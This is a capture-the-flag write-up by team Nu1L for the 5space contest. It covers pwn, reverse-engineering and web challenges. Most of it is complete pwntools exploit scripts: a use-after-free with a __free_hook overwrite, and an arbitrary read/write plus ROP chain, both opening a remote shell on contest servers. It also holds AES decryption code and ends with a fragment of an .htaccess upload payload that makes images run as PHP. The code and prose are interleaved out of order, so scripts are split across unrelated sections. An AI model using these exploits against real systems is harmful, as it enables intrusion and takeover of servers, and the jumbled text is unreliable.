5space WriteUp By Nu1L
5space WriteUp By Nu1L
Pwn
takeeasy
easyfp
easybuf
Reverse
ddl
re1
Web
easyupload
easysqli
codereview
Misc
D1fFeReNcE_F@1G
Can_you_be_rich
Crypto
Chaotic
babystream
创新⽅向
Love
trinewbee
Pwn
takeeasy
⽩给溢出，直接溢出打
easyfp
bye的时候stream可以uaf, 打IO来泄漏然后打free_hook
from pwn import *
# s = process("./pwn",aslr=False)
def cmd(idx):
    s.sendlineafter(">> ",str(idx))
def add(name):
    cmd(1)
    s.sendafter("Name:",name)
def say(buf):
    cmd(3)
    s.sendafter("Say what do you want to say",buf)
def free(name):
    cmd(2)
    s.sendafter("Name:",name)
def bye(y):
    cmd(4)
    s.sendafter('Do you really want to say bye?',y)
def pwn(s):
    for i in range(7):
        bye('n')
        say('123')
    bye('n')
    add(p64(0xfbad3884))
    add('1')
    add('2')
    add('3')
    add('4')
    add('5')
    bye('n')
    say('123')
    bye('n')
    say('123')
    bye('n')
    add(p16(0x92f0))
    add('123')
    add('\x00'*0x18+'\xf0')
    add('123')
    add('234')
    free('123')
    free('234')
    say(p64(0xfbad3884))
    bye('n')
    say(p64(0xfbad3884))
    bye('n')
    add(p16(0x9308))
    add(p64(0xfbad3884))
    add(p64(0xffffffffffffffff)*2)
easybuf
pbtk可以直接提取出来proto⽂件，转pyc转py。⾥⾯是任意地址读写
    add('\x00'*0xb0+p64(0xfbad3884)+p64(0)*3+'\x00')
    libc = ELF("./libc.so.6")
    libc.address = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00")-0x1ec980
    success(hex(libc.address))
    add('123')
    free('123')
    bye('n')
    say('123')
    bye('n')
    add(p64(libc.sym['__free_hook']-8))
    add('123')
    add('/bin/sh\x00'+p64(libc.sym['system']))
    # gdb.attach(s)
    free('/bin/sh\x00')
    s.interactive()
    exit(0)
while True:
    # s = process("./pwn")
    s = remote("47.93.56.17","39642")
    try:
        pwn(s)
    except Exception as e:
        pass
    s.close()
from test_pb2 import Notebook, Note
from pwn import *
def build(name,addr,offset,choice):
    book = Notebook()
    note = book.note.add()
    note.name = name
    note.addr = addr
    note.offset = offset
    note.choice = choice
    payload = book.SerializeToString()
    return payload
def run(buf):
    s.sendlineafter(b"Hello Pls input: ",buf)
    s.sendlineafter(b"file size",str(len(buf)).encode())
def read(addr):
Reverse
ddl
exe调dll内的⼀些函数，直接动调看逻辑即可
输⼊先单字节xor 0x66
再前后16字节分别AES-128，key为"0123456789abcdef"
但是直接⽤标准的发现没解开，调试验证发现改了密钥扩展，直接提它程序算出来的176个字节的迭代key_stream
解题脚本：
    run(build("Nu1L",addr,0,2))
def write(addr):
    run(build("Nu1L",addr,0,1))
s = remote("39.106.134.45","62364")
elf = ELF("./pwn")
write(elf.got['printf'])
libc = ELF("./libc.so.6")
libc.address = u64(s.recvuntil(b"\x7f")[-6:]+b"\x00\x00") - libc.sym['printf']
success(hex(libc.address))
environ = libc.sym['__environ']
write(environ)
stack = u64(s.recvuntil(b"\x7f")[-6:]+b"\x00\x00")-0x100
success(hex(stack))
pop_rdi = 0x0000000000023b6a + libc.address
sh = next(libc.search(b"/bin/sh"))
read(stack)
payload = p64(pop_rdi+1) + p64(pop_rdi) + p64(sh) + p64(libc.sym['system'])
s.send(payload)
run("123")
s.interactive()
//aes.h
#ifndef AES_128_H
#define AES_128_H
#include 
#include 
#define AES_BLOCK_SIZE      16
#define AES_ROUNDS          10  // 12, 14
#define AES_ROUND_KEY_SIZE  176 // AES-128 has 10 rounds, and there is a AddRoundKey 
before first round. (10+1)x16=176.
/**
 * @purpose:            Key schedule for AES-128
 * @par[in]key:         16 bytes of master keys
 * @par[out]roundkeys:  176 bytes of round keys
 */
void aes_key_schedule_128(const uint8_t *key, uint8_t *roundkeys);
/**
 * @purpose:            Encryption. The length of plain and cipher should be one block 
(16 bytes).
 *                      The plaintext and ciphertext may point to the same memory
 * @par[in]roundkeys:   round keys
 * @par[in]plaintext:   plain text
 * @par[out]ciphertext: cipher text
 */
void aes_encrypt_128(const uint8_t *roundkeys, const uint8_t *plaintext, uint8_t 
*ciphertext);
/**
 * @purpose:            Decryption. The length of plain and cipher should be one block 
(16 bytes).
 *                      The ciphertext and plaintext may point to the same memory
 * @par[in]roundkeys:   round keys
 * @par[in]ciphertext:  cipher text
 * @par[out]plaintext:  plain text
 */
void aes_decrypt_128(const uint8_t *roundkeys, const uint8_t *ciphertext, uint8_t 
*plaintext);
#endif
//aes.c
#include 
#include "aes.h"
int main(int argc, char *argv[])
{
  uint8_t i, r;
  uint8_t key[] =
  {
    48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102
  };
  uint8_t ciphertext[AES_BLOCK_SIZE] = {209, 247, 180, 103, 114, 30, 37, 186, 68, 121, 
45, 197, 252, 154, 207, 0};
最后
re1
powerpc64⼩端程序,IDA7.5全decompiler泄露版可反编译
单字节加密 + rot15
其实是多解的⼀个程序,空格和字符'a'加密出来最后的数据⼀样
solve.py
  uint8_t ciphertext1[AES_BLOCK_SIZE] = {169, 168, 249, 237, 77, 14, 116, 97, 184, 23, 
141, 143, 253, 109, 30, 101};
  uint8_t dec_data[AES_BLOCK_SIZE];
  uint8_t roundkeys[AES_ROUND_KEY_SIZE] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 
0x37, 0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x72, 0x7C, 0x01, 0xC8, 0x46, 
0x49, 0x37, 0xFF, 0x7E, 0x70, 0x56, 0x9D, 0x1D, 0x14, 0x33, 0xFB, 0x8A, 0xBF, 0x0E, 
0x6C, 0xCC, 0xF6, 0x39, 0x93, 0xB2, 0x86, 0x6F, 0x0E, 0xAF, 0x92, 0x5C, 0xF5, 0xC1, 
0xF5, 0xE8, 0x15, 0x0D, 0x03, 0xD1, 0x86, 0xBF, 0x85, 0xBE, 0x88, 0x10, 0x17, 0xE2, 
0x7D, 0x39, 0x6D, 0x17, 0xDF, 0x34, 0x6E, 0xC6, 0x59, 0x8B, 0xEB, 0x78, 0xD1, 0x9B, 
0xFC, 0x9A, 0xAC, 0x99, 0xD5, 0x86, 0xCB, 0xAD, 0xBB, 0x40, 0x92, 0x26, 0x50, 0x38, 
0x43, 0xBD, 0xAC, 0xA2, 0xEF, 0x28, 0xEF, 0x59, 0xB1, 0x85, 0x54, 0x19, 0x23, 0xA3, 
0x04, 0x21, 0x60, 0x1E, 0xA8, 0x83, 0x8F, 0xAA, 0x03, 0x2A, 0xC3, 0x2F, 0x57, 0x33, 
0xE0, 0x8C, 0x53, 0x12, 0x80, 0x92, 0xFB, 0x91, 0x0F, 0x25, 0x82, 0x5C, 0x8C, 0x0A, 
0xD5, 0x6F, 0x6C, 0x86, 0x86, 0x7D, 0xEC, 0x14, 0x7D, 0xEC, 0xE3, 0xEC, 0x4C, 0x4D, 
0x76, 0xE6, 0x99, 0x22, 0x1A, 0x60, 0x1F, 0x5F, 0xF6, 0x74, 0x62, 0xB3, 0x15, 0x5D, 
0x21, 0x14, 0xE4, 0xBB, 0xB8, 0x36, 0xFE, 0xDB, 0xA7, 0x69, 0x08, 0xAF, 0xC5, 0xDA, 
0x1D};
  // decryption
  aes_decrypt_128(roundkeys, ciphertext, dec_data);
    printf("Plain text:\n");
  for (i = 0; i  
SetHandler application/x-httpd-php 
phpvalue auto_prepend_file php://filter/convert.base64-encode/resource=2.jpg